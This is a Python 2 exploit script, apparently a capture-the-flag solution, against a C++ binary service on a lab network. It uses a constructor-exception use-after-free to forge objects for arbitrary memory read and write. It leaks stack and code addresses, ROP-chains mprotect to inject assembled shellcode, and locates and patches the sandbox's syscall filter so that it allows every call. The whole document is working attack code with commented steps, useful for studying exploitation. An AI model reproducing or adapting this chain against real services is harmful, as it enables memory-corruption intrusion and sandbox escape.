#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib
import os


ADDR = "172.16.138.128"
PORT = 8888
DEBUG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf

def rtil(count):
    buf = b''
    while count:
        newbuf = s.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def unset_element(idx):
    s.send(struct.pack("<I", 0x3))
    s.send(struct.pack("<I", idx))
    return struct.unpack("<I", rtil(4))[0]


def read_data(idx, siz):
    s.send(struct.pack("<I", 0x2))
    s.send(struct.pack("<I", idx))
    s.send(struct.pack("<Q", siz))
    rbuf = rtil(siz)
    if rbuf is None:
	return ["", -1]
    retcode = struct.unpack("<I", rtil(4))[0]
    return [rbuf, retcode]

def add_data(idx, dat, noret=False):
    s.send(struct.pack("<I", 0x1))
    s.send(struct.pack("<I", idx))
    s.send(struct.pack("<Q", len(dat)))
    s.send(dat)
    if noret:
        return 0
    else:
        return struct.unpack("<I", rtil(4))[0]

def add_element(siz):
    s.send(struct.pack("<I", 0x0))
    s.send(struct.pack("<Q", siz))
    return struct.unpack("<I", rtil(4))[0]

def del_element(idx):
    s.send(struct.pack("<I", 0x4))
    s.send(struct.pack("<I", idx))
    return struct.unpack("<I", rtil(4))[0]

def do_read(addr, size):
    fake_obj = struct.pack("<I", 0x1337)
    fake_obj += struct.pack("<I", 0x0)
    fake_obj += struct.pack("<Q", addr)
    fake_obj += struct.pack("<Q", 0xffffffffffffffff)
    fake_obj += struct.pack("<I", 0x1)
    fake_obj = fake_obj.ljust(0x20, "\x00")
    assert(add_data(0, fake_obj) == len(fake_obj))
    return read_data(0x1337, size)

def do_write(addr, dat, noret=False):
    fake_obj = struct.pack("<I", 0x1337)
    fake_obj += struct.pack("<I", 0x0)
    fake_obj += struct.pack("<Q", addr)
    fake_obj += struct.pack("<Q", 0xffffffffffffffff)
    fake_obj += struct.pack("<I", 0x1)
    fake_obj = fake_obj.ljust(0x20, "\x00")
    assert(add_data(0, fake_obj) == len(fake_obj))
    return add_data(0x1337, dat, noret)


def do_syscall(sc, args):
    syscall_frame = ""
    syscall_frame += struct.pack("<Q", sc)
    for a in args:
        syscall_frame += struct.pack("<Q", a)

    syscall_frame = syscall_frame.ljust(0x38, "\x00")
    do_write(in_bss, syscall_frame)
    s.send(struct.pack("<I", 0x3))
    ret = struct.unpack("<Q", rtil(8))[0]
    tmp = struct.unpack("<I", rtil(4))[0]
    return ret


# We have a use after free
# the constructor of the object adds the object
# to the tree and the does an allocation of the
# buffer. In C++, if there is an exception in the
# constructor, the object is destroyed. 
# This means that the tree can have a reference
# to the object, although it is free'd

# add 'scratch' element
add_element(0x10)

# UAF targets
huge = 0xffffffffffffffff
add_element(huge)
add_element(huge)

# Allocated free'd buffer
# we recycle the 'scratch' element
unset_element(0)
add_element(0x20)

# overwrite UAF target
uid = 0x1337
fake_obj = struct.pack("<I", uid)
fake_obj = fake_obj.ljust(0x20, "\x00")                 # also unsets the inuse flag
add_data(0, fake_obj)

# populate the buffer of the UAF object
# with a valid heap address
# we will partially overwrite this address later
assert(add_element(0x64) == uid) 

# partially overwrite the address
# then use it to leak stuff
fake_obj = struct.pack("<I", uid)
fake_obj += struct.pack("<I", 0x0)
fake_obj += chr(0x98)                                   # this value is "negotiable"
add_data(0, fake_obj)

leakbuf = read_data(uid, 0x64)[0]
l1 = leakbuf[0:8]
stk_leak = struct.unpack("<Q", l1)[0]                   # a stack leak on the heap ? yes because of C++ exception handling/unwinding
l2 = leakbuf[8:16]
libcpp_leak = struct.unpack("<Q", l2)[0]

print "[+] Stack leak: %s [+]"%(hex(stk_leak))

# now let's read the stack
# and leak the .text address
# as well  a libc address
# libc address is not very useful though
s_off = 6 * 8
leakbuf = do_read(stk_leak, 2000)[0]
start = leakbuf[s_off:s_off+8]
start = u64(start)
txt_base = start - 0x15df
read_got = txt_base + 0x204ec8

print "[+] .text base address: %s [+]"%(hex(txt_base))

read_addr = do_read(read_got, 8)[0]
read_addr = u64(read_addr)

# we overwrite the return address of add_data
# and start ropping
# we will ask the trusted code to mprotect the code as RWX
# we will overwrite the unset_element function
# with code that calls the syscall function

stack_frame = stk_leak - 0x8
prdi = p64(txt_base + 0x3763)
prsi = p64(txt_base + 0x1daa)
syscaller = txt_base + 0x2990                           # helper function to ask trusted code for syscalls
unset_elem = txt_base + 0x21C0
main_routine = p64(txt_base + 0x2300)
in_bss = txt_base + 0x205834

# we write the syscall frame somewhere on the stack
# we pass this address to the syscaller
syscall_frame = ""
syscall_frame += struct.pack("<Q", 0xa)
syscall_frame += struct.pack("<Q", unset_elem & 0xfffffffffffff000)
syscall_frame += struct.pack("<Q", 0x4000)
syscall_frame += struct.pack("<Q", 0x7)

do_write(in_bss, syscall_frame)

# call the syscaller
# return to the main_routine
ropc = ""
ropc += prdi + p64(in_bss)
ropc += p64(syscaller)
ropc += main_routine                                    # we return to the main routine

do_write(stack_frame, ropc, True)

# now we can overwrite unset_elem
sc ="""USE64
push r12
mov rdi, %s
mov r12, %s
call r12
push rax
mov edx, 8
mov rsi, rsp
mov rdi, 1
mov eax, 1
syscall
cmp rax, 8
jne bad
pop rax
pop r12
ret
bad:
int3
"""%(hex(in_bss), hex(syscaller))
fp = open("sc.asm", "w")
fp.write(sc)
fp.close()
os.system("nasm sc.asm -o sc.bin")
sc = open("sc.bin", "r").read()
# cleanup
os.system("rm sc.asm sc.bin")

# do the overwrite
do_write(unset_elem, sc)
wr = do_read(unset_elem, len(sc))[0]
assert(wr == sc)

# now we have a way of making syscalls :)
# we use mmap to try and find the address of the trusted code
# through binary search (probably could be optimized)
KStart = 0x10000000 
asiz = 0x200000000000

# find address 1
while True:
    end = KStart + asiz
    if asiz < 0x1000:
        break
    print "[+] Looking in range: %s - %s [+]"%(hex(KStart), hex(end))
    ret = do_syscall(9, [KStart, asiz, 7, 0x4022, 0xffffffffffffffff, 0])
    if ret == KStart:
        ret = do_syscall(11, [KStart, asiz, 0])
        assert(ret == 0)
        KStart += asiz
    elif ret >> 32 != 0xffffffff:
        ret = do_syscall(11, [ret, asiz, 0])
        asiz /= 2
    else:
        print "[+] Screwed [+]"
        exit(0)

addr1 = KStart
print "[+] Found address: %s [+]"%hex(addr1)

sig = "\x41\xff\xd4\x48\x8d\x3d\xa8\x00\x00\x00\x41\xff\xd5\x48\x83\xec"
r = do_read(addr1, len(sig))[0]

if r == sig:
    trusted_code = addr1
else:
    print "[+] Found stack instead :(, try again [+]"
    exit(0)

print "[+] Trusted code: %s [+]"%(hex(trusted_code))

# mark trusted_code as writeable
do_syscall(10, [trusted_code, 0x1000, 7])

# we overwrite the filter function
# used by the syscall dispatcher
# making it return 1 always
sc ="""USE64
mov rax, 1
ret
"""
fp = open("sc.asm", "w")
fp.write(sc)
fp.close()
os.system("nasm sc.asm -o sc.bin")
sc = open("sc.bin", "r").read()
# cleanup
os.system("rm sc.asm sc.bin")
do_write(trusted_code + 0xbf, sc)

# trigger it
# now we have our own shellcode
# (this shellcode just lists the current directory)
# can't use execve(/bin/sh) shellcode because the seccomp
# filter only allows syscalls coming from a given address
lsc = open("ls.bin", "r").read()

# we overwrite unset_elem again
do_write(unset_elem, lsc)

# trigger it
s.send(struct.pack("<I", 0x3))

t = telnetlib.Telnet()
t.sock = s
t.interact()
